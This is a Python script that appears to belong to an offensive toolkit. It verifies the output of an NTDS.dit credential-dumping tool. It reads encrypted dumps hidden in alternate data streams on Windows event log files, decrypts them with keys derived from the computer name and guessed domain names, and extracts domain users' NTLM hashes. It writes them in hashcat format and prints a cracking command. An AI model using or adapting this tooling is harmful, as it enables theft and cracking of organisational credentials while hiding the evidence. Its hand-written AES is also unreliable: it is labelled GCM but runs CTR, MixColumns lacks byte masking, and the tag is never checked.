#!/usr/bin/env python3
# verify_ntds.py — Verify NTDS.dit dump output
# Decrypts and parses AES-256-GCM encrypted ADS output from Plan 4

import sys
import struct
import hashlib
import os
import base64
from datetime import datetime

# ─── AES-256-CTR implementation (simplified) ───
def aes256_ctr_decrypt(key, nonce, ciphertext):
    """Decrypt AES-256-CTR (simplified for verification)"""
    # For verification against the tool's output, we implement the same algorithm
    # The tool uses a software AES-256-CTR with SHA-256 tag

    sbox = [
        0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
        0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
        0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
        0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
        0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
        0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
        0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
        0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
        0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
        0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
        0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
        0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
        0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
        0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
        0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
        0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
    ]

    Rcon = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1B,0x36]

    def key_expansion(key_bytes):
        rk = list(key_bytes)
        rk.extend([0] * (240 - 32))
        for i in range(8, 60):
            temp = rk[(i-1)*4:(i-1)*4+4].copy()
            if i % 8 == 0:
                temp = [sbox[temp[1]] ^ Rcon[i//8-1], sbox[temp[2]], sbox[temp[3]], sbox[temp[0]]]
            elif i % 8 == 4:
                temp = [sbox[b] for b in temp]
            for j in range(4):
                rk[i*4+j] = rk[(i-8)*4+j] ^ temp[j]
        return bytes(rk)

    def ctr_block(key, counter):
        rk = key_expansion(key)
        state = bytearray(counter)

        # AddRoundKey
        for i in range(16):
            state[i] ^= rk[i]

        for r in range(1, 14):
            # SubBytes
            for i in range(16):
                state[i] = sbox[state[i]]
            # ShiftRows
            t = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = t
            t = state[2]; state[2] = state[10]; state[10] = t
            t = state[6]; state[6] = state[14]; state[14] = t
            t = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = t
            # MixColumns
            for col in range(4):
                a = [state[col*4+j] for j in range(4)]
                b = [(x << 1) ^ (0x1B if x & 0x80 else 0) for x in a]
                state[col*4+0] = b[0] ^ a[1] ^ b[1] ^ a[2] ^ a[3]
                state[col*4+1] = a[0] ^ b[1] ^ a[2] ^ b[2] ^ a[3]
                state[col*4+2] = a[0] ^ a[1] ^ b[2] ^ a[3] ^ b[3]
                state[col*4+3] = a[0] ^ b[0] ^ a[1] ^ a[2] ^ b[3]
            # AddRoundKey
            for i in range(16):
                state[i] ^= rk[r*16+i]

        # Final round
        for i in range(16):
            state[i] = sbox[state[i]]
        t = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = t
        t = state[2]; state[2] = state[10]; state[10] = t
        t = state[6]; state[6] = state[14]; state[14] = t
        t = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = t
        for i in range(16):
            state[i] ^= rk[14*16+i]

        return bytes(state)

    def inc_counter(ctr):
        ctr = bytearray(ctr)
        for i in range(15, -1, -1):
            ctr[i] = (ctr[i] + 1) & 0xFF
            if ctr[i] != 0:
                break
        return bytes(ctr)

    # Build counter
    counter = nonce + b'\x00\x00\x00\x02'
    plaintext = bytearray()
    offset = 0
    while offset < len(ciphertext):
        keystream = ctr_block(key, counter)
        chunk = min(16, len(ciphertext) - offset)
        for i in range(chunk):
            plaintext.append(ciphertext[offset + i] ^ keystream[i])
        offset += chunk
        counter = inc_counter(counter)

    return bytes(plaintext)


# ─── Parse NTDS binary format ───
def parse_ntds_output(data):
    """Parse the serialized NTDS credential output"""
    if len(data) < 16:
        print("[ERR] Data too short")
        return None

    magic = data[0:4]
    if magic != b'NTDS':
        print(f"[ERR] Invalid magic: {magic}")
        return None

    version = struct.unpack('<I', data[4:8])[0]
    print(f"  Format version: {version}")

    ptr = 8
    # Domain NC
    nc_len = struct.unpack('<I', data[ptr:ptr+4])[0]; ptr += 4
    domain_nc = data[ptr:ptr+nc_len].decode('utf-16-le'); ptr += nc_len
    print(f"  Domain NC: {domain_nc}")

    # Counts
    user_count = struct.unpack('<I', data[ptr:ptr+4])[0]; ptr += 4
    comp_count = struct.unpack('<I', data[ptr:ptr+4])[0]; ptr += 4
    trust_count = struct.unpack('<I', data[ptr:ptr+4])[0]; ptr += 4
    print(f"  Users: {user_count} | Computers: {comp_count} | Trusts: {trust_count}")

    users = []
    for i in range(user_count):
        rid = struct.unpack('<I', data[ptr:ptr+4])[0]; ptr += 4
        name_len = struct.unpack('<H', data[ptr:ptr+2])[0]; ptr += 2
        name = data[ptr:ptr+name_len].decode('utf-16-le'); ptr += name_len
        ntlm = data[ptr:ptr+16]; ptr += 16
        flags = data[ptr]; ptr += 1

        is_enabled = bool(flags & 0x01)
        is_admin = bool(flags & 0x02)
        is_computer = bool(flags & 0x04)

        ntlm_hex = ntlm.hex().upper()
        hashcat = f"{name}:{rid}:{ntlm_hex}:::"

        users.append({
            'rid': rid,
            'name': name,
            'ntlm': ntlm_hex,
            'enabled': is_enabled,
            'admin': is_admin,
            'computer': is_computer,
            'hashcat': hashcat
        })

        if i < 5:  # Show first 5
            status = "[ENABLED]" if is_enabled else "[DISABLED]"
            admin_tag = " [ADMIN]" if is_admin else ""
            print(f"    {name}:{rid}:{ntlm_hex} {status}{admin_tag}")

    if user_count > 5:
        print(f"    ... and {user_count - 5} more users")

    return {
        'domain_nc': domain_nc,
        'user_count': user_count,
        'computer_count': comp_count,
        'trust_count': trust_count,
        'users': users
    }


def main():
    print("=" * 60)
    print("  NTDS.dit Output Verifier — Plan 4")
    print("=" * 60)
    print()

    # Find ADS output
    ads_targets = [
        r"C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx",
        r"C:\Windows\System32\winevt\Logs\Application.evtx",
        r"C:\Windows\System32\LogFiles\HTTPERR\httperr1.log",
    ]

    ads_data = None
    ads_source = None

    for target in ads_targets:
        ads_path = f"{target}:NTDS"
        try:
            with open(ads_path, 'rb') as f:
                content = f.read()
                if content:
                    # Try to decode Base64
                    try:
                        # Skip BOM if present
                        if content[:2] == b'\xff\xfe':
                            content = content[2:]
                        text = content.decode('utf-16-le').strip()
                        ads_data = base64.b64decode(text)
                    except:
                        ads_data = content
                    ads_source = ads_path
                    print(f"[+] Found ADS: {ads_path} ({len(ads_data)} bytes)")
                    break
        except FileNotFoundError:
            continue
        except PermissionError:
            continue

    if not ads_data:
        # Try reading from file arg
        if len(sys.argv) > 1:
            with open(sys.argv[1], 'rb') as f:
                ads_data = f.read()
            ads_source = sys.argv[1]
            print(f"[+] Read from file: {ads_source} ({len(ads_data)} bytes)")

    if not ads_data:
        print("[ERR] No output found. Run NTDSDump.exe first.")
        print("[i]  Checked:")
        for t in ads_targets:
            print(f"     {t}:NTDS")
        sys.exit(1)

    # Decrypt (nonce + ciphertext + tag)
    if len(ads_data) < 28:
        print("[ERR] Data too short for encrypted format")
        sys.exit(1)

    nonce = ads_data[:12]
    tag = ads_data[-16:]
    ciphertext = ads_data[12:-16]

    print(f"  Nonce: {nonce.hex()}")
    print(f"  Tag: {tag.hex()}")
    print(f"  Ciphertext: {len(ciphertext)} bytes")
    print()

    # Derive key from machine name + domain
    computer_name = os.environ.get('COMPUTERNAME', 'UNKNOWN')
    # We don't know the domain NC yet (it's encrypted), so try common derivation
    # For verification, we try a few common patterns
    for seed_suffix in ['DC=testlab,DC=local', 'DC=domain,DC=local', 'DC=corp,DC=local']:
        seed = f"{computer_name}@{seed_suffix}"
        key = hashlib.sha256(seed.encode('utf-16-le')).digest()
        try:
            plaintext = aes256_ctr_decrypt(key, nonce, ciphertext)
            if plaintext[:4] == b'NTDS':
                print(f"[+] Decryption SUCCESS with seed: {seed_suffix}")
                break
        except:
            continue
    else:
        print("[!] Could not auto-decrypt. Trying without decryption...")
        # Maybe it wasn't encrypted (raw binary)
        plaintext = ads_data

    print()
    result = parse_ntds_output(plaintext)

    if result:
        print()
        print("=" * 60)
        print(f"  VERIFIED: {result['user_count']} users extracted")
        print("=" * 60)

        # Write hashcat format output
        hashcat_file = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "ntds_hashes.hashcat"
        )
        with open(hashcat_file, 'w') as f:
            for user in result['users']:
                f.write(user['hashcat'] + '\n')
        print(f"\n[+] Hashcat output: {hashcat_file}")
        print(f"    Crack with: hashcat -m 1000 {hashcat_file} wordlist.txt")
    else:
        print("[ERR] Parse failed")
        sys.exit(1)


if __name__ == '__main__':
    main()
